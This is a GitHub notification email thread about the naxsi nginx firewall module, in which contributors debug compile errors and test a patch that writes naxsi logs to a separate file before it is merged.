PM, binaryanomaly notifications@github.comwrote:\n\nNext error, guess I'm really the wrong guy to fiddle with C code, sry ;)\ncc -c -pipe -O -W -Wall -Wpointer-arith -Wno-unused-parameter -Werror -g\n-g -O2 -fstack-protector --param=ssp-buffer-size=4 -Wformat\n-Werror=format-security -D_FORTIFY_SOURCE=2 -I src/core -I src/event -I\nsrc/event/modules -I src/os/unix -I objs -I src/http -I src/http/modules -I\nsrc/mail \\\n-o objs/addon/naxsi_src/naxsi_log.o \\\n/opt/nginx-1.5.12/naxsi/naxsi_src//naxsi_log.c\n/opt/nginx-1.5.12/naxsi/naxsi_src//naxsi_log.c:40:13: error: expected\ndeclaration specifiers or '...' before '(' token\nvoid ndebug((const char\n_)str[i].data) { ^ /opt/nginx-1.5.12/naxsi/naxsi_src//naxsi_log.c: In\nfunction 'ngx_http_naxsi_logfile_loc_conf':\n/opt/nginx-1.5.12/naxsi/naxsi_src//naxsi_log.c:131:5: error: implicit\ndeclaration of function 'ndebug' [-Werror=implicit-function-declaration]\nndebug(\"ngx_http_naxsi_logfile_loc_conf(): not able to open log file\\n\"); ^\ncc1: all warnings being treated as errors make[1]: _[objs/addon/naxsi_src/naxsi_log.o] Error 1\nmake[1]: Leaving directory `/opt/nginx-1.5.12'\nmake: *** [build] Error 2\n\nReply to this email directly or view it on GitHubhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-39238742\n.\n. Ok, let's run it for some hours and send me back the 2 files (/tmp/debug\nand logs). except if the logs are totaly empty => just the /tmp/debug. :-)\nand I will supply a new naxsi_log if I don't manage to find the problem :-(\n\nOn Tue, Apr 1, 2014 at 2:35 PM, binaryanomaly notifications@github.comwrote:\n\nTold you ;) thanks that worked.\nNow I have the same situation as before, naxsi rule fires, no log entry in\nnaxsi.log\n/tmp/debug looks like this:\nnaxsi_http_log_handler()\nngx_log_naxsi()\nnaxsi_http_log_handler()\nnaxsi_http_log_handler()\nnaxsi_http_log_handler()\n\nReply to this email directly or view it on GitHubhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-39241711\n.\n. Hi Reto,\n\ncan you try the new code I pushed on github. There are no debug log (in\n/tmp/debug).\nI'm testing it on my employer company, and it is stable. (and should\ncompile without issues :-) )\nRegards,\nNicolas\nOn Tue, Apr 1, 2014 at 2:57 PM, Nicolas Zin nicolas.zin@gmail.com wrote:\n\nOk, let's run it for some hours and send me back the 2 files (/tmp/debug\nand logs). except if the logs are totaly empty => just the /tmp/debug. :-)\nand I will supply a new naxsi_log if I don't manage to find the problem :-(\nOn Tue, Apr 1, 2014 at 2:35 PM, binaryanomaly notifications@github.comwrote:\n\nTold you ;) thanks that worked.\nNow I have the same situation as before, naxsi rule fires, no log entry\nin naxsi.log\n/tmp/debug looks like this:\nnaxsi_http_log_handler()\nngx_log_naxsi()\nnaxsi_http_log_handler()\nnaxsi_http_log_handler()\nnaxsi_http_log_handler()\n\nReply to this email directly or view it on GitHubhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-39241711\n.\n. damned! :-)\n\n\nI pushed a fix.\nOn Wed, Apr 2, 2014 at 5:28 PM, binaryanomaly notifications@github.comwrote:\n\nHey Nicolas\nThanks for the update. Sorry but I got an error again ;)\ncc -c -pipe  -O -W -Wall -Wpointer-arith -Wno-unused-parameter -Werror -g\n-g -O2 -fstack-protector --param=ssp-buffer-size=4 -Wformat\n-Werror=format-security -D_FORTIFY_SOURCE=2  -I src/core -I src/event -I\nsrc/event/modules -I src/os/unix -I objs -I src/http -I src/http/modules -I\nsrc/mail \\\n-o objs/addon/naxsi_src/naxsi_log.o \\\n/opt/nginx-1.5.12/naxsi/naxsi_src//naxsi_log.c\n/opt/nginx-1.5.12/naxsi/naxsi_src//naxsi_log.c: In function\n'ngx_log_naxsi':\n/opt/nginx-1.5.12/naxsi/naxsi_src//naxsi_log.c:320:19: error: comparison\nbetween signed and unsigned integer expressions [-Werror=sign-compare]\n     for (l = 0; l < logarray->nelts; l++) {\n                   ^\ncc1: all warnings being treated as errors\nmake[1]: * [objs/addon/naxsi_src/naxsi_log.o] Error 1\nmake[1]: Leaving directory `/opt/nginx-1.5.12'\nmake: * [build] Error 2\nrgds\nReto\nFrom: Nicolas Zin notifications@github.com\nReply: nbs-system/naxsi reply@reply.github.com\nDate: 2. April 2014 at 23:22:27\nTo: nbs-system/naxsi naxsi@noreply.github.com\nCc: binaryanomaly reto.haeberli@comnode.net\nSubject:  Re: [naxsi] redirect naxsi log to a separate log file (#100)\nHi Reto,\ncan you try the new code I pushed on github. There are no debug log (in\n/tmp/debug).\nI'm testing it on my employer company, and it is stable. (and should\ncompile without issues :-) )\nRegards,\nNicolas\nOn Tue, Apr 1, 2014 at 2:57 PM, Nicolas Zin nicolas.zin@gmail.com\nwrote:\n\nOk, let's run it for some hours and send me back the 2 files (/tmp/debug\nand logs). except if the logs are totaly empty => just the /tmp/debug.\n:-)\nand I will supply a new naxsi_log if I don't manage to find the problem\n:-(\nOn Tue, Apr 1, 2014 at 2:35 PM, binaryanomaly notifications@github.comwrote:\n\nTold you ;) thanks that worked.\nNow I have the same situation as before, naxsi rule fires, no log entry\nin naxsi.log\n/tmp/debug looks like this:\nnaxsi_http_log_handler()\nngx_log_naxsi()\nnaxsi_http_log_handler()\nnaxsi_http_log_handler()\nnaxsi_http_log_handler()\n\nReply to this email directly or view it on GitHub<\nhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-39241711>\n.\n\n\nReply to this email directly or view it on GitHub.\n\n\nReply to this email directly or view it on GitHubhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-39386120\n.\n. Good news! Let see what Thibault think about it now :-)\n\nThanks you\nOn Thu, Apr 3, 2014 at 2:59 AM, binaryanomaly notifications@github.comwrote:\n\nGreat, it builds, it runs and it logs for now ;)\nrgds\nReto\nFrom: Nicolas Zin notifications@github.com\nReply: nbs-system/naxsi reply@reply.github.com\nDate: 3. April 2014 at 00:18:22\nTo: nbs-system/naxsi naxsi@noreply.github.com\nCc: binaryanomaly reto.haeberli@comnode.net\nSubject:  Re: [naxsi] redirect naxsi log to a separate log file (#100)\ndamned! :-)\nI pushed a fix.\nOn Wed, Apr 2, 2014 at 5:28 PM, binaryanomaly notifications@github.comwrote:\n\nHey Nicolas\nThanks for the update. Sorry but I got an error again ;)\ncc -c -pipe -O -W -Wall -Wpointer-arith -Wno-unused-parameter -Werror -g\n-g -O2 -fstack-protector --param=ssp-buffer-size=4 -Wformat\n-Werror=format-security -D_FORTIFY_SOURCE=2 -I src/core -I src/event -I\nsrc/event/modules -I src/os/unix -I objs -I src/http -I src/http/modules\n-I\nsrc/mail \\\n-o objs/addon/naxsi_src/naxsi_log.o \\\n/opt/nginx-1.5.12/naxsi/naxsi_src//naxsi_log.c\n/opt/nginx-1.5.12/naxsi/naxsi_src//naxsi_log.c: In function\n'ngx_log_naxsi':\n/opt/nginx-1.5.12/naxsi/naxsi_src//naxsi_log.c:320:19: error: comparison\nbetween signed and unsigned integer expressions [-Werror=sign-compare]\nfor (l = 0; l < logarray->nelts; l++) {\n^\ncc1: all warnings being treated as errors\nmake[1]: * [objs/addon/naxsi_src/naxsi_log.o] Error 1\nmake[1]: Leaving directory `/opt/nginx-1.5.12'\nmake: * [build] Error 2\nrgds\nReto\nFrom: Nicolas Zin notifications@github.com\nReply: nbs-system/naxsi reply@reply.github.com\nDate: 2. April 2014 at 23:22:27\nTo: nbs-system/naxsi naxsi@noreply.github.com\nCc: binaryanomaly reto.haeberli@comnode.net\nSubject: Re: [naxsi] redirect naxsi log to a separate log file (#100)\nHi Reto,\ncan you try the new code I pushed on github. There are no debug log (in\n/tmp/debug).\nI'm testing it on my employer company, and it is stable. (and should\ncompile without issues :-) )\nRegards,\nNicolas\nOn Tue, Apr 1, 2014 at 2:57 PM, Nicolas Zin nicolas.zin@gmail.com\nwrote:\n\nOk, let's run it for some hours and send me back the 2 files\n(/tmp/debug\nand logs). except if the logs are totaly empty => just the /tmp/debug.\n:-)\nand I will supply a new naxsi_log if I don't manage to find the\nproblem\n:-(\nOn Tue, Apr 1, 2014 at 2:35 PM, binaryanomaly \nnotifications@github.comwrote:\n\nTold you ;) thanks that worked.\nNow I have the same situation as before, naxsi rule fires, no log\nentry\nin naxsi.log\n/tmp/debug looks like this:\nnaxsi_http_log_handler()\nngx_log_naxsi()\nnaxsi_http_log_handler()\nnaxsi_http_log_handler()\nnaxsi_http_log_handler()\n\nReply to this email directly or view it on GitHub<\nhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-39241711>\n.\n\n\nReply to this email directly or view it on GitHub.\n\n\nReply to this email directly or view it on GitHub<\nhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-39386120>\n.\n\nReply to this email directly or view it on GitHub.\n\n\nReply to this email directly or view it on GitHubhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-39418557\n.\n. Hi Reto,\n\nis it still working fine?\nOn my side, things are going smoothly: still logging, logrotate working\nfine (and nx_util working fine on the logs)\nRegards,\nNicolas\nOn Thu, Apr 3, 2014 at 2:59 AM, binaryanomaly notifications@github.comwrote:\n\nGreat, it builds, it runs and it logs for now ;)\nrgds\nReto\nFrom: Nicolas Zin notifications@github.com\nReply: nbs-system/naxsi reply@reply.github.com\nDate: 3. April 2014 at 00:18:22\nTo: nbs-system/naxsi naxsi@noreply.github.com\nCc: binaryanomaly reto.haeberli@comnode.net\nSubject:  Re: [naxsi] redirect naxsi log to a separate log file (#100)\ndamned! :-)\nI pushed a fix.\nOn Wed, Apr 2, 2014 at 5:28 PM, binaryanomaly notifications@github.comwrote:\n\nHey Nicolas\nThanks for the update. Sorry but I got an error again ;)\ncc -c -pipe -O -W -Wall -Wpointer-arith -Wno-unused-parameter -Werror -g\n-g -O2 -fstack-protector --param=ssp-buffer-size=4 -Wformat\n-Werror=format-security -D_FORTIFY_SOURCE=2 -I src/core -I src/event -I\nsrc/event/modules -I src/os/unix -I objs -I src/http -I src/http/modules\n-I\nsrc/mail \\\n-o objs/addon/naxsi_src/naxsi_log.o \\\n/opt/nginx-1.5.12/naxsi/naxsi_src//naxsi_log.c\n/opt/nginx-1.5.12/naxsi/naxsi_src//naxsi_log.c: In function\n'ngx_log_naxsi':\n/opt/nginx-1.5.12/naxsi/naxsi_src//naxsi_log.c:320:19: error: comparison\nbetween signed and unsigned integer expressions [-Werror=sign-compare]\nfor (l = 0; l < logarray->nelts; l++) {\n^\ncc1: all warnings being treated as errors\nmake[1]: * [objs/addon/naxsi_src/naxsi_log.o] Error 1\nmake[1]: Leaving directory `/opt/nginx-1.5.12'\nmake: * [build] Error 2\nrgds\nReto\nFrom: Nicolas Zin notifications@github.com\nReply: nbs-system/naxsi reply@reply.github.com\nDate: 2. April 2014 at 23:22:27\nTo: nbs-system/naxsi naxsi@noreply.github.com\nCc: binaryanomaly reto.haeberli@comnode.net\nSubject: Re: [naxsi] redirect naxsi log to a separate log file (#100)\nHi Reto,\ncan you try the new code I pushed on github. There are no debug log (in\n/tmp/debug).\nI'm testing it on my employer company, and it is stable. (and should\ncompile without issues :-) )\nRegards,\nNicolas\nOn Tue, Apr 1, 2014 at 2:57 PM, Nicolas Zin nicolas.zin@gmail.com\nwrote:\n\nOk, let's run it for some hours and send me back the 2 files\n(/tmp/debug\nand logs). except if the logs are totaly empty => just the /tmp/debug.\n:-)\nand I will supply a new naxsi_log if I don't manage to find the\nproblem\n:-(\nOn Tue, Apr 1, 2014 at 2:35 PM, binaryanomaly \nnotifications@github.comwrote:\n\nTold you ;) thanks that worked.\nNow I have the same situation as before, naxsi rule fires, no log\nentry\nin naxsi.log\n/tmp/debug looks like this:\nnaxsi_http_log_handler()\nngx_log_naxsi()\nnaxsi_http_log_handler()\nnaxsi_http_log_handler()\nnaxsi_http_log_handler()\n\nReply to this email directly or view it on GitHub<\nhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-39241711>\n.\n\n\nReply to this email directly or view it on GitHub.\n\n\nReply to this email directly or view it on GitHub<\nhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-39386120>\n.\n\nReply to this email directly or view it on GitHub.\n\n\nReply to this email directly or view it on GitHubhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-39418557\n.\n. Hi Thibault,\n\ndo you know when you will have time to review my code, and hopefully\nintegrate it into your code?\nDo you want I \"rebase\" it on my repo? or just grab it will all the commits\nI have done?\nRegards,\nNicolas\nOn Thu, Apr 3, 2014 at 11:20 AM, Nicolas Zin nicolas.zin@gmail.com wrote:\n\nGood news! Let see what Thibault think about it now :-)\nThanks you\nOn Thu, Apr 3, 2014 at 2:59 AM, binaryanomaly notifications@github.comwrote:\n\nGreat, it builds, it runs and it logs for now ;)\nrgds\nReto\nFrom: Nicolas Zin notifications@github.com\nReply: nbs-system/naxsi reply@reply.github.com\nDate: 3. April 2014 at 00:18:22\nTo: nbs-system/naxsi naxsi@noreply.github.com\nCc: binaryanomaly reto.haeberli@comnode.net\nSubject:  Re: [naxsi] redirect naxsi log to a separate log file (#100)\ndamned! :-)\nI pushed a fix.\nOn Wed, Apr 2, 2014 at 5:28 PM, binaryanomaly notifications@github.comwrote:\n\nHey Nicolas\nThanks for the update. Sorry but I got an error again ;)\ncc -c -pipe -O -W -Wall -Wpointer-arith -Wno-unused-parameter -Werror\n-g\n-g -O2 -fstack-protector --param=ssp-buffer-size=4 -Wformat\n-Werror=format-security -D_FORTIFY_SOURCE=2 -I src/core -I src/event -I\nsrc/event/modules -I src/os/unix -I objs -I src/http -I\nsrc/http/modules -I\nsrc/mail \\\n-o objs/addon/naxsi_src/naxsi_log.o \\\n/opt/nginx-1.5.12/naxsi/naxsi_src//naxsi_log.c\n/opt/nginx-1.5.12/naxsi/naxsi_src//naxsi_log.c: In function\n'ngx_log_naxsi':\n/opt/nginx-1.5.12/naxsi/naxsi_src//naxsi_log.c:320:19: error:\ncomparison\nbetween signed and unsigned integer expressions [-Werror=sign-compare]\nfor (l = 0; l < logarray->nelts; l++) {\n^\ncc1: all warnings being treated as errors\nmake[1]: * [objs/addon/naxsi_src/naxsi_log.o] Error 1\nmake[1]: Leaving directory `/opt/nginx-1.5.12'\nmake: * [build] Error 2\nrgds\nReto\nFrom: Nicolas Zin notifications@github.com\nReply: nbs-system/naxsi reply@reply.github.com\nDate: 2. April 2014 at 23:22:27\nTo: nbs-system/naxsi naxsi@noreply.github.com\nCc: binaryanomaly reto.haeberli@comnode.net\nSubject: Re: [naxsi] redirect naxsi log to a separate log file (#100)\nHi Reto,\ncan you try the new code I pushed on github. There are no debug log (in\n/tmp/debug).\nI'm testing it on my employer company, and it is stable. (and should\ncompile without issues :-) )\nRegards,\nNicolas\nOn Tue, Apr 1, 2014 at 2:57 PM, Nicolas Zin nicolas.zin@gmail.com\nwrote:\n\nOk, let's run it for some hours and send me back the 2 files\n(/tmp/debug\nand logs). except if the logs are totaly empty => just the\n/tmp/debug.\n:-)\nand I will supply a new naxsi_log if I don't manage to find the\nproblem\n:-(\nOn Tue, Apr 1, 2014 at 2:35 PM, binaryanomaly \nnotifications@github.comwrote:\n\nTold you ;) thanks that worked.\nNow I have the same situation as before, naxsi rule fires, no log\nentry\nin naxsi.log\n/tmp/debug looks like this:\nnaxsi_http_log_handler()\nngx_log_naxsi()\nnaxsi_http_log_handler()\nnaxsi_http_log_handler()\nnaxsi_http_log_handler()\n\nReply to this email directly or view it on GitHub<\nhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-39241711>\n.\n\n\nReply to this email directly or view it on GitHub.\n\n\nReply to this email directly or view it on GitHub<\nhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-39386120>\n.\n\nReply to this email directly or view it on GitHub.\n\n\nReply to this email directly or view it on GitHubhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-39418557\n.\n. Hello Thomas,\n\n\nany news about integration?\nHave a gook week\nOn Thu, Apr 10, 2014 at 1:26 PM, buixor notifications@github.com wrote:\n\nHi,\nI'm happy to see there is some good progress on this, thanks Nicolas & Reto\n:)\nI think we will be able to merge it within short time as it seems that\nthere is now some positive production feedback.\nCan you guys continue production test for a few more days before we merge\nit ? I will try to take some time as well to continue testing & auditing it\nbefore merge ! (I hope this week-end, I should be less busy until end of\nApr)\nCheers,\nOn Sat, Apr 5, 2014 at 8:22 PM, binaryanomaly <notifications@github.com\n\nwrote:\nYes, everything's fine over here! :)\nrgds\nReto\nFrom: Nicolas Zin notifications@github.com\nReply: nbs-system/naxsi reply@reply.github.com\nDate: 5. April 2014 at 20:17:37\nTo: nbs-system/naxsi naxsi@noreply.github.com\nCc: binaryanomaly\nSubject: Re: [naxsi] redirect naxsi log to a separate log file (#100)\nHi Reto,\nis it still working fine?\nOn my side, things are going smoothly: still logging, logrotate working\nfine (and nx_util working fine on the logs)\nRegards,\nNicolas\n\nReply to this email directly or view it on GitHub<\nhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-39646492>\n.\n\n\u2014\nReply to this email directly or view it on GitHubhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-40113381\n.\n. Hi Thibault,\n\nhow are you? (not stuck in transport strikes in Paris? :-) )\nany news from integrating my patch to naxsi?\nRegards,\nOn Mon, Apr 21, 2014 at 12:38 PM, Nicolas Zin nicolas.zin@gmail.com wrote:\n\nHello Thomas,\nany news about integration?\nHave a gook week\nOn Thu, Apr 10, 2014 at 1:26 PM, buixor notifications@github.com wrote:\n\nHi,\nI'm happy to see there is some good progress on this, thanks Nicolas &\nReto\n:)\nI think we will be able to merge it within short time as it seems that\nthere is now some positive production feedback.\nCan you guys continue production test for a few more days before we merge\nit ? I will try to take some time as well to continue testing & auditing\nit\nbefore merge ! (I hope this week-end, I should be less busy until end of\nApr)\nCheers,\nOn Sat, Apr 5, 2014 at 8:22 PM, binaryanomaly <notifications@github.com\n\nwrote:\nYes, everything's fine over here! :)\nrgds\nReto\nFrom: Nicolas Zin notifications@github.com\nReply: nbs-system/naxsi reply@reply.github.com\nDate: 5. April 2014 at 20:17:37\nTo: nbs-system/naxsi naxsi@noreply.github.com\nCc: binaryanomaly\nSubject: Re: [naxsi] redirect naxsi log to a separate log file (#100)\nHi Reto,\nis it still working fine?\nOn my side, things are going smoothly: still logging, logrotate working\nfine (and nx_util working fine on the logs)\nRegards,\nNicolas\n\nReply to this email directly or view it on GitHub<\nhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-39646492>\n.\n\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-40113381.\n. HI,\n\n\nI didn't pay attention to the newly added syslog support, but I think my\npatch is still valid: I need to separate naxsi log from error logs. That\nthe whole point.\nAfter that, maybe we can do it differently (like stating to not log it on\nfile but via syslog), but my main need still remains.\nI can work this week end to recompile it agains nginx 1.7 to check if\neverything works fine if you want. Or you can try on your own.\nRegards,\nOn Tue, Jun 17, 2014 at 3:43 AM, buixor notifications@github.com wrote:\n\nHi Nicolas !\nMy bad for all the delay, actually, I saw that nginx 1.7.1 added syslog\nsupport !\nI want to have a look at this ... do you think the patch is still needed ?\nOn the other hand, as it seems to run in production on your side without\nany issues (that I'm aware of :p), I guess I would be ok for the merge ;)\n(Just need to make sure it won't conflict with those modificaitons)\nCheers, and sorry again for the delay !\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-46276707.\n. Hi,\n\nI have recompiled naxsi (with my diff) without problem with nginx 1.7.2. It\nis running currently on my personnal web server.\nYou can test by yourself with my ppa:\nhttps://launchpad.net/~nicolas-zin/+archive/nginx\nRegards,\nNicolas Zin\nOn Tue, Jun 17, 2014 at 9:44 AM, binaryanomaly notifications@github.com\nwrote:\n\nI think I had it running on v1.7.1 for a short time. But then switched\nback to the official tree because I had to reinstall nginx for other\nreasons. Didn't encounter any problems afaik. Someone should double check\nand then it would be about time for a merge, finally :)\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-46308057.\n. Hi Thibault,\n\nanny news to integrate my patch?\nRegards,\nOn Sat, Jun 28, 2014 at 3:24 PM, Nicolas Zin nicolas.zin@gmail.com wrote:\n\nHi,\nI have recompiled naxsi (with my diff) without problem with nginx 1.7.2.\nIt is running currently on my personnal web server.\nYou can test by yourself with my ppa:\nhttps://launchpad.net/~nicolas-zin/+archive/nginx\nRegards,\nNicolas Zin\nOn Tue, Jun 17, 2014 at 9:44 AM, binaryanomaly notifications@github.com\nwrote:\n\nI think I had it running on v1.7.1 for a short time. But then switched\nback to the official tree because I had to reinstall nginx for other\nreasons. Didn't encounter any problems afaik. Someone should double check\nand then it would be about time for a merge, finally :)\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-46308057.\n. Hi,\n\n\nany news?\nOn Tue, Aug 26, 2014 at 11:44 AM, buixor notifications@github.com wrote:\n\nHi Nicolas,\nI'm really sorry, but I don't have much time to work on naxsi right now.\nI should have more bandwith next month (mid-september), I will keep you\nposted.\nThanks for your patience; and sorry for the lag on my side ;)\nOn Tue, Aug 19, 2014 at 8:58 PM, Nicolas Zin notifications@github.com\nwrote:\n\nHi Thibault,\nanny news to integrate my patch?\nRegards,\nOn Sat, Jun 28, 2014 at 3:24 PM, Nicolas Zin nicolas.zin@gmail.com\nwrote:\n\nHi,\nI have recompiled naxsi (with my diff) without problem with nginx\n1.7.2.\nIt is running currently on my personnal web server.\nYou can test by yourself with my ppa:\nhttps://launchpad.net/~nicolas-zin/+archive/nginx\nRegards,\nNicolas Zin\nOn Tue, Jun 17, 2014 at 9:44 AM, binaryanomaly \nnotifications@github.com\nwrote:\n\nI think I had it running on v1.7.1 for a short time. But then\nswitched\nback to the official tree because I had to reinstall nginx for other\nreasons. Didn't encounter any problems afaik. Someone should double\ncheck\nand then it would be about time for a merge, finally :)\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-46308057.\n\n\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-52682151.\n\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-53397463.\n. Hello Thibault,\n\nI come to the news. Do you have time this end of september to integrate my\npatch?\nRegards,\nNicolas\nOn Tue, Aug 26, 2014 at 5:44 AM, buixor notifications@github.com wrote:\n\nHi Nicolas,\nI'm really sorry, but I don't have much time to work on naxsi right now.\nI should have more bandwith next month (mid-september), I will keep you\nposted.\nThanks for your patience; and sorry for the lag on my side ;)\nOn Tue, Aug 19, 2014 at 8:58 PM, Nicolas Zin notifications@github.com\nwrote:\n\nHi Thibault,\nanny news to integrate my patch?\nRegards,\nOn Sat, Jun 28, 2014 at 3:24 PM, Nicolas Zin nicolas.zin@gmail.com\nwrote:\n\nHi,\nI have recompiled naxsi (with my diff) without problem with nginx\n1.7.2.\nIt is running currently on my personnal web server.\nYou can test by yourself with my ppa:\nhttps://launchpad.net/~nicolas-zin/+archive/nginx\nRegards,\nNicolas Zin\nOn Tue, Jun 17, 2014 at 9:44 AM, binaryanomaly \nnotifications@github.com\nwrote:\n\nI think I had it running on v1.7.1 for a short time. But then\nswitched\nback to the official tree because I had to reinstall nginx for other\nreasons. Didn't encounter any problems afaik. Someone should double\ncheck\nand then it would be about time for a merge, finally :)\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-46308057.\n\n\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-52682151.\n\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-53397463.\n. I will check that during the week end I think, this need more work :-)\n\nOn Tue, Oct 7, 2014 at 5:14 PM, blotus notifications@github.com wrote:\n\nHi Nicolas,\nJust 2 things :\n- If the log file is removed while nginx is running, NAXSI_FMTs won't\n  be logged anymore, and there is no warning indicating that nginx cannot\n  write to the log file. It would be nice to detect that and use the nginx\n  error log as a fallback.\n- NAXSI_EXLOG (\n  https://github.com/nbs-system/naxsi/wiki/dynamicmodifiers) are not\n  written to the naxsi log file.\nOnce those 2 are fixed, this will (finally :)) get merged.\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-58263400.\n. yeah \\o/\n\nHope I missed no bug.\nOn Mon, Oct 13, 2014 at 8:08 AM, buixor notifications@github.com wrote:\n\nfinally \\o/\nOn Mon, Oct 13, 2014 at 2:05 PM, blotus notifications@github.com wrote:\n\nMerged #100 https://github.com/nbs-system/naxsi/pull/100.\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/pull/100#event-177610525.\n\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-58883094.\n. I can check that this week end.\n\nWhat kind of error do you have?\nOn Thu, Nov 6, 2014 at 4:27 AM, itpp16 notifications@github.com wrote:\n\nI have tried but not been able to figure out how to fix this, the one who\nwrote it must know whats going on, it should produce the same faults on\nlinux.\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/issues/140#issuecomment-61948680.\n. Can you check with the following .h and .c files? (if it appears in github)\n\nOn Thu, Nov 6, 2014 at 7:46 AM, itpp16 notifications@github.com wrote:\n\nThe 3 errors are at the top of this issue. Tnx for looking.\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/issues/140#issuecomment-61973722.\n. Can you check with the files on my personal webserver:\n- http://www.elanprod.com/naxsi.h\n- http://www.elanprod.com/naxsi_log.c\n\nand tell me if it works fine\nOn Fri, Nov 7, 2014 at 7:46 PM, Nicolas Zin nicolas.zin@gmail.com wrote:\n\nCan you check with the following .h and .c files? (if it appears in github)\nOn Thu, Nov 6, 2014 at 7:46 AM, itpp16 notifications@github.com wrote:\n\nThe 3 errors are at the top of this issue. Tnx for looking.\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/issues/140#issuecomment-61973722.\n. Hi itpp16,\n\n\ndid you took the naxsi.h and naxsi_log.c in the email in attachment or the\none on my website (they differ, you should take the one on my website. I\nupdated this afternoon).\nif you have precompiled headers, can you remove it/clean it?\nWhat I changed is the definition of ngx_log_naxsi (which is used on line\n964 of naxsi_runtime.c), and you must not see an error stating va_list: it\ndoesn't exist anymore in the ngx_log_naxsi function definition.\nHope it will works this time. Else tell me how you compile it on Windows.\nRegards,\nNicolas\nOn Sat, Nov 8, 2014 at 9:26 AM, itpp16 notifications@github.com wrote:\n\nStill the same;\n/naxsi_runtime.c(964) : warning C4057: 'function' : 'va_list' differs in\nindirection to slightly different base types from 'u_char *'\n/naxsi_utils.c(866) : warning C4133: 'function' : incompatible types -\nfrom 'ngx_str_t *' to 'va_list'\n/naxsi_utils.c(866) : warning C4020: 'ngx_log_naxsi' : too many actual\nparameters\nWhich version did you try to fix? not the one here as none of the latest\n'VARIADIC_MACROS' are in there.\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/issues/140#issuecomment-62259499.\n. I tried to compiled it on Linux, I have some errors:\n\n/home/nzin/nginx/nginx-1.7.2/debian/modules/naxsi/naxsi_src/naxsi_runtime.c:1306:48:\nerror: macro \"ngx_log_debug0\" passed 5 arguments, but takes just 4\n      \"malformed url, possible attack [%s]\", str);\n                                                ^\n/home/nzin/nginx/nginx-1.7.2/debian/modules/naxsi/naxsi_src/naxsi_runtime.c:121:5:\nerror: 'ngx_log_debug0' undeclared (first use in this function)\n     ngx_log_debug0(NGX_LOG_DEBUG_HTTP, r->connection->log, 0,\nVA_ARGS); \\\n     ^\n/home/nzin/nginx/nginx-1.7.2/debian/modules/naxsi/naxsi_src/naxsi_runtime.c:1305:2:\nnote: in expansion of macro 'dummy_error_fatal'\n  dummy_error_fatal(ctx, req,\n  ^\n/home/nzin/nginx/nginx-1.7.2/debian/modules/naxsi/naxsi_src/naxsi_runtime.c:121:5:\nnote: each undeclared identifier is reported only once for each function it\nappears in\n     ngx_log_debug0(NGX_LOG_DEBUG_HTTP, r->connection->log, 0,\nVA_ARGS); \\\n     ^\n/home/nzin/nginx/nginx-1.7.2/debian/modules/naxsi/naxsi_src/naxsi_runtime.c:1305:2:\nnote: in expansion of macro 'dummy_error_fatal'\n  dummy_error_fatal(ctx, req,\n  ^\n/home/nzin/nginx/nginx-1.7.2/debian/modules/naxsi/naxsi_src/naxsi_runtime.c:\nIn function 'ngx_http_dummy_uri_parse':\n/home/nzin/nginx/nginx-1.7.2/debian/modules/naxsi/naxsi_src/naxsi_runtime.c:2036:65:\nerror: macro \"ngx_log_debug0\" passed 5 arguments, but takes just 4\n     dummy_error_fatal(ctx, r, \"failed alloc of %d\", r->uri.len+1);\n                                                                 ^\n/home/nzin/nginx/nginx-1.7.2/debian/modules/naxsi/naxsi_src/naxsi_runtime.c:121:5:\nerror: 'ngx_log_debug0' undeclared (first use in this function)\n     ngx_log_debug0(NGX_LOG_DEBUG_HTTP, r->connection->log, 0,\nVA_ARGS); \\\n     ^\n/home/nzin/nginx/nginx-1.7.2/debian/modules/naxsi/naxsi_src/naxsi_runtime.c:2036:5:\nnote: in expansion of macro 'dummy_error_fatal'\n     dummy_error_fatal(ctx, r, \"failed alloc of %d\", r->uri.len+1);\nOn Tue, Nov 18, 2014 at 5:15 AM, buixor notifications@github.com wrote:\n\nHi,\nSorry, quite busy today :(\nI'll try to give it a look tomorrow or at least by end of week.\nOn Tue, Nov 18, 2014 at 9:10 AM, itpp16 notifications@github.com wrote:\n\nbuixor & nzin, can you have a look at the latest 146 pull ?\n\u2014\nReply to this email directly or view it 